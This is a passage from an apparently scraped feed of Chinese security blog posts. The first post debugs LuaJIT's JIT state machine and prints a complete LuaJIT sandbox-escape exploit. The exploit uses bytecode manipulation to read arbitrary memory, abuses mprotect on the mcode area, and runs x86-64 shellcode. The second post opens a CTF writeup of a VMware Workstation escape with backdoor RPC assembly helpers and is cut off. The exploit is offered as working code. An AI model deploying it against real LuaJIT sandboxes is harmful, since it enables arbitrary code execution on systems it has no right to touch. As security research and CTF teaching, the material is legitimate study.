case LJ_TRACE_RECORD:
      trace_pendpatch(J, 0);
      setvmstate(J2G(J), RECORD);
      lj_vmevent_send_(L, RECORD,
    /* Save/restore tmptv state for trace recorder. */
    TValue savetv = J2G(J)-&amp;gt;tmptv;
    TValue savetv2 = J2G(J)-&amp;gt;tmptv2;
    setintV(L-&amp;gt;top++, J-&amp;gt;cur.traceno);
    setfuncV(L, L-&amp;gt;top++, J-&amp;gt;fn);
    setintV(L-&amp;gt;top++, J-&amp;gt;pt ? (int32_t)proto_bcpos(J-&amp;gt;pt, J-&amp;gt;pc) : -1);
    setintV(L-&amp;gt;top++, J-&amp;gt;framedepth);
      ,
    J2G(J)-&amp;gt;tmptv = savetv;
    J2G(J)-&amp;gt;tmptv2 = savetv2;
      );
      lj_record_ins(J); // &amp;lt;-- 进行record
      break;
​
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个时候我直接断点在&lt;code&gt;trace_state&lt;/code&gt;查看了能触发情况下的执行流程，发现为:&lt;code&gt;START -&amp;gt; RECORD+ -&amp;gt; END -&amp;gt; (ASM) -&amp;gt; ERR -&amp;gt; ASM&lt;/code&gt;，最终核心位置在&lt;code&gt;ASM&lt;/code&gt;里。括号里的ASM是在后来调试中才发现的，第一次并没有发现这个地方。&lt;/p&gt;&lt;p&gt;虽然比较奇怪为什么出现了&lt;code&gt;ERR&lt;/code&gt;，但是无论如何最终只要能到&lt;code&gt;ASM&lt;/code&gt;我们就有机会，那么未成功触发的原因：没有进入到&lt;code&gt;ASM&lt;/code&gt;状态。&lt;/p&gt;&lt;p&gt;相同的方法我也在没成功触发的exp上执行了一遍，发现最终停留在&lt;code&gt;RECORD&lt;/code&gt;状态，看来是&lt;code&gt;RECORD&lt;/code&gt;状态一直没有解除。&lt;/p&gt;&lt;p&gt;现在来找找没成功的理由。首先看看我们最后生成的字节码:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;luajit -blg evil.lua evil.out
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意这一条命令需要在&lt;code&gt;luajit/src/&lt;/code&gt;里执行，需要有&lt;code&gt;luajit/src/jit&lt;/code&gt;这个extension。（也可以使用其他办法导入，我个人认为这样比较简单罢了）否则会报：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;unknown luaJIT command or jit.* modules not installed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;关键位置:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;    local i = 1
    while i &amp;lt; 0x1000000 do 
        i = i + 1 
        --print(i)
    end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;字节码：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;0083    TSETB   19  14   1
0084    TGETB   19  14   1
0085    TSETB   19  14   2
0086    TGETB   19  14   1
0087    TSETB   19  14   3
0088    KNUM    19  10      ; 2.0236928853657e-320
0089    TSETB   19  14   4
0090    KSHORT  19   1
0091 =&amp;gt; KNUM    20  11      ; 16777216 &amp;lt;-- 0x1000000
0092    ISGE    19  20
0093    JMP     20 =&amp;gt; 0097 ; &amp;lt;-- 跳过循环
0094    LOOP    20 =&amp;gt; 0097
0095    ADDVN   19  19  12  ; 1 &amp;lt;-- 加一
0096    JMP     20 =&amp;gt; 0091 ; &amp;lt;-- 循环
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;基本上可以确认这里就是我们试图进行jit的while loop了。&lt;/p&gt;&lt;p&gt;回到&lt;code&gt;lj_record_ins&lt;/code&gt;:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;case BC_LOOP:
    rec_loop_interp(J, pc, rec_loop(J, ra));
    break;

​
/* Handle the case when an interpreted loop op is hit. */
static void rec_loop_interp(jit_State *J, const BCIns *pc, LoopEvent ev)
{
  if (J-&amp;gt;parent == 0 &amp;amp;&amp;amp; J-&amp;gt;exitno == 0) {
    if (pc == J-&amp;gt;startpc &amp;amp;&amp;amp; J-&amp;gt;framedepth + J-&amp;gt;retdepth == 0) {
      /* Same loop? */
      if (ev == LOOPEV_LEAVE)  /* Must loop back to form a root trace. */
    lj_trace_err(J, LJ_TRERR_LLEAVE);
      lj_record_stop(J, LJ_TRLINK_LOOP, J-&amp;gt;cur.traceno);  /* Looping trace. */
    } else if (ev != LOOPEV_LEAVE) {  /* Entering inner loop? */
      /* It&#39;s usually better to abort here and wait until the inner loop
      ** is traced. But if the inner loop repeatedly didn&#39;t loop back,
      ** this indicates a low trip count. In this case try unrolling
      ** an inner loop even in a root trace. But it&#39;s better to be a bit
      ** more conservative here and only do it for very short loops.
      */
      if (bc_j(*pc) != -1 &amp;amp;&amp;amp; !innerloopleft(J, pc))
    lj_trace_err(J, LJ_TRERR_LINNER);  /* Root trace hit an inner loop. */
      if ((ev != LOOPEV_ENTERLO &amp;amp;&amp;amp;
       J-&amp;gt;loopref &amp;amp;&amp;amp; J-&amp;gt;cur.nins - J-&amp;gt;loopref &amp;gt; 24) || --J-&amp;gt;loopunroll &amp;lt; 0)
    lj_trace_err(J, LJ_TRERR_LUNROLL);  /* Limit loop unrolling. */
      J-&amp;gt;loopref = J-&amp;gt;cur.nins;
    }
  } else if (ev != LOOPEV_LEAVE) {  /* Side trace enters an inner loop. */
    J-&amp;gt;loopref = J-&amp;gt;cur.nins;
    if (--J-&amp;gt;loopunroll &amp;lt; 0)
      lj_trace_err(J, LJ_TRERR_LUNROLL);  /* Limit loop unrolling. */
  }  /* Side trace continues across a loop that&#39;s left or not entered. */
}
​
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;继续跟下去会发现是先进入END，然后ASM，但是在ASM过程中失败，才进入到了ERR，然后又从ERR再次进入到ASM。而且其实在第一次ASM的时候就已经进行mprotect了，所以最后的ASM并没有太大影响，而是正常的jit过程。&lt;/p&gt;&lt;p&gt;之后的跟代码过程就不再详细解释了，有兴趣的同学可以自己去尝试一下，这一部分比较直接，基本就是按照我们之前得到的bt一层一层进入，不过中间有好几个地方值得关注，直接让我们知道了为什么第一次的不能成功：&lt;/p&gt;&lt;p&gt;条件1:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;static MCode *asm_exitstub_gen(ASMState *as, ExitNo group)
     10  {
     11    ExitNo i, groupofs = (group*EXITSTUBS_PER_GROUP) &amp;amp; 0xff;
     12    MCode *mxp = as-&amp;gt;mcbot;
     13    MCode *mxpstart = mxp;
 →   14    if (mxp + (2+2)*EXITSTUBS_PER_GROUP+8+5 &amp;gt;= as-&amp;gt;mctop)
     15      asm_mclimit(as);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也就是&lt;code&gt;mcbot + X &amp;gt;= mctop&lt;/code&gt;，管他多少只要&lt;code&gt;mcbot &amp;gt;= mctop&lt;/code&gt;就行。&lt;/p&gt;&lt;p&gt;条件2:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;   329   /* Abort the reservation. */
    330  void lj_mcode_abort(jit_State *J)
    331  {
    332    if (J-&amp;gt;mcarea)
 →  333      mcode_protect(J, MCPROT_RUN);
    334  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要&lt;code&gt;mcarea != 0&lt;/code&gt;！而回想第一次，我们其实是把&lt;code&gt;mcarea&lt;/code&gt;设置为0的，于是这里是不会成功触发的。&lt;/p&gt;&lt;p&gt;条件3(参数):&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;    193  /* Change protection of MCode area. */
    194  static void mcode_protect(jit_State *J, int prot)
    195  {
    196    if (J-&amp;gt;mcprot != prot) {
 →  197      if (LJ_UNLIKELY(mcode_setprot(J-&amp;gt;mcarea, J-&amp;gt;szmcarea, prot)))
    198        mcode_protfail(J);
    199      J-&amp;gt;mcprot = prot;
    200    }
    201  }
    202  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那么我们参数的设置方法就基本上清楚了，这也正好印证了我们之前的设置方法正好使得这里的&lt;code&gt;mcarea&lt;/code&gt;符合要求。不过我们的设置还有一个问题就是&lt;code&gt;szmcarea&lt;/code&gt;太大，可以稍微改小一点，不过在mprotect的处理中即使太大也不是很影响。 &lt;/p&gt;&lt;p&gt;另外需要注意的几个后置条件：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;→  378     if ((size_t)need &amp;gt; sizemcode)
    379      lj_trace_err(J, LJ_TRERR_MCODEOV);  /* Too long for any area. */
    380    if (J-&amp;gt;szallmcarea + sizemcode &amp;gt; maxmcode)
    381      lj_trace_err(J, LJ_TRERR_MCODEAL);
    382    mcode_allocarea(J);
    383    lj_trace_err(J, LJ_TRERR_MCODELM);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;380,381的这个条件比较关键，因为后来的分析发现如果这里出现问题是会被free掉的（有兴趣的同学可以看代码），而在zircon内发现如果被free掉会导致一个无效内存错，这样即使mprotect了也无法执行代码，因为我们需要在mprotect之后正常回到lua的执行过程，然后才能去通过调用任意c函数的方式跳到shellcode。所以在设置&lt;code&gt;szallmzarea&lt;/code&gt;的时候也要注意到大小的问题。&lt;/p&gt;&lt;p&gt;到现在，我们就终于弄明白了为什么原来的exp是不能直接使用的了。。因为他的参数设置有问题。。&lt;/p&gt;&lt;p&gt;之后的err是在上一个代码片段383行位置触发的，也触发了panic的提示信息，但是发现其实这个并不会影响后面的执行过程，所以不用太在意。具体原因纠结起来感觉会更加耗费时间，我就没有继续深究下去了，不过我猜测应该是由于我们搞坏了一些&lt;code&gt;State&lt;/code&gt;内的元数据，在链表中有了一些奇怪的事情发生导致的。不过还好这个err不会导致太多问题。&lt;/p&gt;&lt;p&gt;接下来我们就要进入到另一个硬核的世界了。。。fuchsia.&lt;/p&gt;&lt;h2&gt;&lt;b&gt;luajit 沙箱逃逸执行shellcode exp&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;orig_exp.lua:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;-- The following function serves as the template for evil.lua.
-- The general outline is to compile this function as-written, dump
-- it to bytecode, manipulate the bytecode a bit, and then save the
-- result as evil.lua.
local evil = function(v)
  -- This is the x86_64 native code which we&#39;ll execute. It
  -- is a very benign payload which just prints &quot;Hello World&quot;
  -- and then fixes up some broken state.
  local shellcode =
    &quot;\76\139\87\16&quot;..       -- mov r10, [rdi+16]
    &quot;\184\4\0\0\2&quot;..        -- mov eax, 0x2000004
    &quot;\191\1\0\0\0&quot;..        -- mov edi, 1
    &quot;\72\141\53\51\0\0\0&quot;.. -- lea rsi, [-&amp;gt;msg]
    &quot;\186\12\0\0\0&quot;..       -- mov edx, 12
    &quot;\15\5&quot;..               -- syscall
    &quot;\72\133\192&quot;..         -- test rax, rax
    &quot;\184\74\0\0\2&quot;..       -- mov eax, 0x200004a
    &quot;\121\12&quot;..             -- jns -&amp;gt;is_osx
    &quot;\184\1\0\0\0&quot;..        -- mov eax, 1
    &quot;\15\5&quot;..               -- syscall
    &quot;\184\10\0\0\0&quot;..       -- mov eax, 10
                            -- -&amp;gt;is_osx:
    &quot;\73\139\58&quot;..          -- mov rdi, [r10]
    &quot;\72\139\119\8&quot;..       -- mov rsi, [rdi+8]
    &quot;\186\7\0\0\0&quot;..        -- mov edx, 7
    &quot;\15\5&quot;..               -- syscall
    &quot;\73\139\114\8&quot;..       -- mov rsi, [r10+8]
    &quot;\72\137\55&quot;..          -- mov [rdi], rsi
    &quot;\195&quot;..                -- ret
                            -- -&amp;gt;msg:
    &quot;Hello World\n&quot;
​
  -- The dirty work is done by the following &quot;inner&quot; function.
  -- This inner function exists because we require a vararg call
  -- frame on the Lua stack, and for the function associated with
  -- said frame to have certain special upvalues.
  local function inner(...)
    if false then
      -- The following three lines turn into three bytecode
      -- instructions. We munge the bytecode slightly, and then
      -- later reinterpret the instructions as a cdata object,
      -- which will end up being `cdata&amp;lt;const char *&amp;gt;: NULL`.
      -- The `if false` wrapper ensures that the munged bytecode
      -- isn&#39;t executed.
      local cdata = -32749
      cdata = 0
      cdata = 0
    end
​
    -- Through the power of bytecode manipulation, the
    -- following three functions will become (the fast paths of)
    -- string.byte, string.char, and string.sub. This is
    -- possible because LuaJIT has bytecode instructions
    -- corresponding to the fast paths of said functions. Note
    -- that we musn&#39;t stray from the fast path (because the
    -- fallback C code won&#39;t be wired up). Also note that the
    -- interpreter state will be slightly messed up after
    -- calling one of these functions.
    local function s_byte(s) end
    local function s_char(i, _) end
    local function s_sub(s, i, j) end
​
    -- The following function does nothing, but calling it will
    -- restore the interpreter state which was messed up following
    -- a call to one of the previous three functions. Because this
    -- function contains a cdata literal, loading it from bytecode
    -- will result in the ffi library being initialised (but not
    -- registered in the global namespace).
    local function resync() return 0LL end
​
    -- Helper function to reinterpret the first four bytes of a
    -- string as a uint32_t, and return said value as a number.
    local function s_uint32(s)
      local result = 0
      for i = 4, 1, -1 do
        result = result * 256 + s_byte(s_sub(s, i, i))
        resync()
      end
      return result
    end
​
    -- The following line obtains the address of the GCfuncL
    -- object corresponding to &quot;inner&quot;. As written, it just fetches
    -- the 0th upvalue, and does some arithmetic. After some
    -- bytecode manipulation, the 0th upvalue ends up pointing
    -- somewhere very interesting: the frame info TValue containing
    -- func|FRAME_VARG|delta. Because delta is small, this TValue
    -- will end up being a denormalised number, from which we can
    -- easily pull out 32 bits to give us the &quot;func&quot; part.
    local iaddr = (inner * 2^1022 * 2^52) % 2^32
​
    -- The following five lines read the &quot;pc&quot; field of the GCfuncL
    -- we just obtained. This is done by creating a GCstr object
    -- overlaying the GCfuncL, and then pulling some bytes out of
    -- the string. Bytecode manipulation results in a nice KPRI
    -- instruction which preserves the low 32 bits of the istr
    -- TValue while changing the high 32 bits to specify that the
    -- low 32 bits contain a GCstr*.
    local istr = (iaddr - 4) + 2^52
    istr = -32764 -- Turned into KPRI(str)
    local pc = s_sub(istr, 5, 8)
    istr = resync()
    pc = s_uint32(pc)
​
    -- The following three lines result in the local variable
    -- called &quot;memory&quot; being `cdata&amp;lt;const char *&amp;gt;: NULL`. We can
    -- subsequently use this variable to read arbitrary memory
    -- (one byte at a time). Note again the KPRI trick to change
    -- the high 32 bits of a TValue. In this case, the low 32 bits
    -- end up pointing to the bytecode instructions at the top of
    -- this function wrapped in `if false`.
    local memory = (pc + 8) + 2^52
    memory = -32758 -- Turned into KPRI(cdata)
    memory = memory + 0
​
    -- Helper function to read a uint32_t from any memory location.
    local function m_uint32(offs)
      local result = 0
      for i = offs + 3, offs, -1 do
        result = result * 256 + (memory[i] % 256)
      end
      return result
    end
​
    -- Helper function to extract the low 32 bits of a TValue.
    -- In particular, for TValues containing a GCobj*, this gives
    -- the GCobj* as a uint32_t. Note that the two memory reads
    -- here are GCfuncL::uvptr[1] and GCupval::v.
    local vaddr = m_uint32(m_uint32(iaddr + 24) + 16)
    local function low32(tv)
      v = tv
      return m_uint32(vaddr)
    end
​
    -- Helper function which is the inverse of s_uint32: given a
    -- 32 bit number, returns a four byte string.
    local function ub4(n)
      local result = &quot;&quot;
      for i = 0, 3 do
        local b = n % 256
        n = (n - b) / 256
        result = result .. s_char(b)
        resync()
      end
      return result
    end
​
    -- The following four lines result in the local variable
    -- called &quot;mctab&quot; containing a very special table: the
    -- array part of the table points to the current Lua
    -- universe&#39;s jit_State::patchins field. Consequently,
    -- the table&#39;s [0] through [4] fields allow access to the
    -- mcprot, mcarea, mctop, mcbot, and szmcarea fields of
    -- the jit_State. Note that LuaJIT allocates the empty
    -- string within global_State, so a fixed offset from the
    -- address of the empty string gives the fields we&#39;re
    -- after within jit_State.
    local mctab_s = &quot;\0\0\0\0\99\4\0\0&quot;.. ub4(low32(&quot;&quot;) + 2748)
      ..&quot;\0\0\0\0\0\0\0\0\0\0\0\0\5\0\0\0\255\255\255\255&quot;
    local mctab = low32(mctab_s) + 16 + 2^52
    mctab = -32757 -- Turned into KPRI(table)
​
    -- Construct a string consisting of 4096 x86 NOP instructions.
    local nop4k = &quot;\144&quot;
    for i = 1, 12 do nop4k = nop4k .. nop4k end
​
    -- Create a copy of the shellcode which is page aligned, and
    -- at least one page big, and obtain its address in &quot;asaddr&quot;.
    local ashellcode = nop4k .. shellcode .. nop4k
    local asaddr = low32(ashellcode) + 16
    asaddr = asaddr + 2^12 - (asaddr % 2^12)
​
    -- The following seven lines result in the memory protection of
    -- the page at asaddr changing from read/write to read/execute.
    -- This is done by setting the jit_State::mcarea and szmcarea
    -- fields to specify the page in question, setting the mctop and
    -- mcbot fields to an empty subrange of said page, and then
    -- triggering some JIT compilation. As a somewhat unfortunate
    -- side-effect, the page at asaddr is added to the jit_State&#39;s
    -- linked-list of mcode areas (the shellcode unlinks it).
    --[[
    local mcarea = mctab[1]
    --mctab[0] = 0
    mctab[0] = 0x1234/ 2^52 / 2^1022
    mctab[1] = 0x4321/ 2^52 / 2^1022
    mctab[2] = 0xdead / 2^52 / 2^1022
    mctab[3] = 0xbeef / 2^52 / 2^1022
    mctab[4] = 2^12 / 2^52 / 2^1022
    --while mctab[0] == 0 do end
    local i = 1
    while i &amp;lt; 0x1000000 do 
        i = i + 1 
        --print(i)
    end
    --]]
​
    local mcarea = mctab[1]
    mctab[0] = asaddr / 2^52 / 2^1022
    mctab[1] = asaddr / 2^52 / 2^1022
    mctab[2] = mctab[1]
    mctab[3] = 0x8000 / 2^52 / 2^1022
    mctab[4] = 2^12 / 2^52 / 2^1022
    --while mctab[0] == 0 do end
    local i = 1
    while i &amp;lt; 0x1000000 do 
        i = i + 1 
        --print(i)
    end
    --]]
    -- The following three lines construct a GCfuncC object
    -- whose lua_CFunction field is set to asaddr. A fixed
    -- offset from the address of the empty string gives us
    -- the global_State::bc_cfunc_int field.
    local fshellcode = ub4(low32(&quot;&quot;) + 132) ..&quot;\0\0\0\0&quot;..
      ub4(asaddr) ..&quot;\0\0\0\0&quot;
    fshellcode = -32760 -- Turned into KPRI(func)
​
    -- Finally, we invoke the shellcode (and pass it some values
    -- which allow it to remove the page at asaddr from the list
    -- of mcode areas).
    fshellcode(mctab[1], mcarea)
  end
  inner()
end
​
-- Some helpers for manipulating bytecode:
local ffi = require &quot;ffi&quot;
local bit = require &quot;bit&quot;
local BC = {KSHORT = 41, KPRI = 43}
​
-- Dump the as-written evil function to bytecode:
local estr = string.dump(evil, true)
local buf = ffi.new(&quot;uint8_t[?]&quot;, #estr+1, estr)
local p = buf + 5
​
-- Helper function to read a ULEB128 from p:
local function read_uleb128()
  local v = p[0]; p = p + 1
  if v &amp;gt;= 128 then
    local sh = 7; v = v - 128
    repeat
      local r = p[0]
      v = v + bit.lshift(bit.band(r, 127), sh)
      sh = sh + 7
      p = p + 1
    until r &amp;lt; 128
  end
  return v
end
​
-- The dumped bytecode contains several prototypes: one for &quot;evil&quot;
-- itself, and one for every (transitive) inner function. We step
-- through each prototype in turn, and tweak some of them.
while true do
  local len = read_uleb128()
  if len == 0 then break end
  local pend = p + len
  local flags, numparams, framesize, sizeuv = p[0], p[1], p[2], p[3]
  p = p + 4
  read_uleb128()
  read_uleb128()
  local sizebc = read_uleb128()
  local bc = p
  local uv = ffi.cast(&quot;uint16_t*&quot;, p + sizebc * 4)
  if numparams == 0 and sizeuv == 3 then
    -- This branch picks out the &quot;inner&quot; function.
    -- The first thing we do is change what the 0th upvalue
    -- points at:
    uv[0] = uv[0] + 2
    -- Then we go through and change everything which was written
    -- as &quot;local_variable = -327XX&quot; in the source to instead be
    -- a KPRI instruction:
    for i = 0, sizebc do
      if bc[0] == BC.KSHORT then
        local rd = ffi.cast(&quot;int16_t*&quot;, bc)[1]
        if rd &amp;lt;= -32749 then
          bc[0] = BC.KPRI
          bc[3] = 0
          if rd == -32749 then
            -- the `cdata = -32749` line in source also tweaks
            -- the two instructions after it:
            bc[4] = 0
            bc[8] = 0
          end
        end
      end
      bc = bc + 4
    end
  elseif sizebc == 1 then
    -- As written, the s_byte, s_char, and s_sub functions each
    -- contain a single &quot;return&quot; instruction. We replace said
    -- instruction with the corresponding fast-function instruction.
    bc[0] = 147 + numparams
    bc[2] = bit.band(1 + numparams, 6)
  end
  p = pend
end
​
-- Finally, save the manipulated bytecode as evil.lua:
local f = io.open(&quot;evil.lua&quot;, &quot;wb&quot;)
f:write(ffi.string(buf, #estr))
f:close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-12-26-53329563</guid>
<pubDate>Wed, 26 Dec 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Real World CTF 2018 Finals Station-Escape Writeup</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-12-11-52140921.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/52140921&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-109690a7eff1cc6e46d439e585195c5c_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;by r3kapig&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;RWCTF Final是我们觉得非常不错的一次竞赛，非常贴近实战，其中每道题目都值得深入研究。其中Station-Escape是一道VMWare Workstation逃逸的题目，我们觉得非常cool，所以进行了详细分析，这里非常感谢&lt;b&gt;长亭科技&lt;/b&gt;的&lt;b&gt;flyyy&lt;/b&gt;师傅贡献的非常优秀的题目和悉心的技术指导。本文分析工作由&lt;b&gt;r3kapig&lt;/b&gt;的&lt;b&gt;Ne0&lt;/b&gt;和&lt;b&gt;bibi&lt;/b&gt;完成。&lt;/blockquote&gt;&lt;h2&gt;前置知识&lt;/h2&gt;&lt;p&gt;在VMWare中，有一个奇特的攻击面，就是vmtools。vmtools帮助宿主机和客户机完成包括文件传输在内的一系列的通信和交互，其中使用了一种被称为backdoor的接口。backdoor接口是如何和宿主机进行通信的呢，我们观察backdoor函数的实现，可以发现如下代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
MOV EAX, 564D5868h                      /* magic number     */
MOV EBX, command-specific-parameter
MOV CX,  backdoor-command-number
MOV DX,  5658h                          /* VMware I/O Port  */

IN  EAX, DX (or OUT DX, EAX)
&lt;/code&gt;&lt;p&gt;首先需要明确的是，该接口在用户态就可以使用。在通常环境下，IN指令是一条特权指令，在普通用户态程序下是无法使用的。因此，运行这条指令会让用户态程序出错并陷出到hypervisor层，从而hypervisor层可以对客户机进行相关的操作和处理，因此利用此机制完成了通信。利用backdoor的通信机制，客户机便可以使用RPC进行一系列的操作，例如拖放、复制、获取信息、发送信息等等。&lt;/p&gt;&lt;p&gt;backdoor机制所有的命令和调用方法，基本都是首先设置寄存器、然后调用IN或OUT特权指令的模式。那么我们使用backdoor传输RPC指令需要经过哪些步骤呢？我们以本题涉及到的backdoor操作进行说明：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;+------------------+
     | Open RPC channel |
     +---------+--------+
               |
  +------------v-----------+
  | Send RPC command length|
  +------------+-----------+
               |
  +------------v-----------+
  | Send RPC command data  |
  +------------+-----------+
               |
 +-------------v------------+
 | Recieve RPC reply length |
 +-------------+------------+
               |
  +------------v-----------+
  | Receive RPC reply data |
  +------------+-----------+
               |
+--------------v-------------+
| Finish receiving RPC reply |
+--------------+-------------+
               |
     +---------v---------+
     | Close RPC channel |
     +-------------------+&lt;/code&gt;&lt;blockquote&gt;以下内容主要参考（该文档和真实逆向情况略有出入，将会在后文中说明）：&lt;a href=&quot;https://sites.google.com/site/chitchatvmback/backdoor&quot;&gt;https://sites.google.com/site/chitchatvmback/backdoor&lt;/a&gt;&lt;/blockquote&gt;&lt;h2&gt;Open RPC channel&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：00h&lt;/blockquote&gt;&lt;p&gt;调用IN（OUT）前，需要设置的寄存器内容：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
EBX = 49435052h - RPC open magic number (&#39;RPCI&#39;)
ECX(HI) = 0000h - subcommand number
ECX(LO) = 001Eh - command number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回值：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
ECX = 00010000h: success / 00000000h: failure
EDX(HI) = RPC channel number&lt;/code&gt;&lt;p&gt;该功能用于打开RPC的channel，其中ECX会返回是否成功，EDX返回值会返回一个channel的编号，在后续的RPC通信中，将使用该编号。这里需要注意的是，在单个虚拟机中只能同时使用8个channel（&lt;code class=&quot;inline&quot;&gt;#0 - #7&lt;/code&gt;）,当尝试打开第9个channel的时候，会检查其他channel的打开时间，如果时间过了某一个值，会将超时的channel关闭，再把这个channel的编号返回；如果都没有超时，create channel会失败。&lt;/p&gt;&lt;p&gt;我们可以使用如下函数实现Open RPC channel的过程：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
	 asm(&quot;movl %%eax,%%ebx\n\t&quot;
                &quot;movq %%rdi,%%r10\n\t&quot;
                &quot;movq %%rsi,%%r11\n\t&quot;
                &quot;movq %%rdx,%%r12\n\t&quot;
		&quot;movq %%rcx,%%r13\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0xc9435052,%%ebx\n\t&quot;
                &quot;movl $0x1e,%%ecx\n\t&quot;
                &quot;movl $0x5658,%%edx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%edi,(%%r10)\n\t&quot;
                &quot;movl %%esi,(%%r11)\n\t&quot;
                &quot;movl %%edx,(%%r12)\n\t&quot;
		&quot;movl %%ecx,(%%r13)\n\t&quot;
		:
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r8&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;,&quot;%r13&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;Send RPC command length&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：01h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
EBX = command length (not including the terminating NULL)
ECX(HI) = 0001h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回值：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
ECX = 00810000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;在发送RPC command前，需要先发送RPC command的长度，需要注意的是，此时我们输入的channel number所指向的channel必须处于已经open的状态。ECX会返回是否成功发送。具体实现如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
	asm(&quot;movl %%eax,%%ebx\n\t&quot;
		&quot;movq %%r8,%%r10\n\t&quot;
                &quot;movl %%ecx,%%ebx\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0001001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                :
                :
        	:&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
	);
}
&lt;/code&gt;&lt;h2&gt;Send RPC command data&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：02h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
EBX = 4 bytes from the command data (the first byte in LSB)
ECX(HI) = 0002h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回值:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
ECX = 000010000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;该功能必须在Send RPC command length后使用,每次只能发送4个字节。例如，如果要发送命令&lt;code class=&quot;inline&quot;&gt;machine.id.get&lt;/code&gt;，那么必须要调用4次，分别为：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EBX set to 6863616Dh (&quot;mach&quot;)
EBX set to 2E656E69h (&quot;ine.&quot;)
EBX set to 672E6469h (&quot;id.g&quot;)
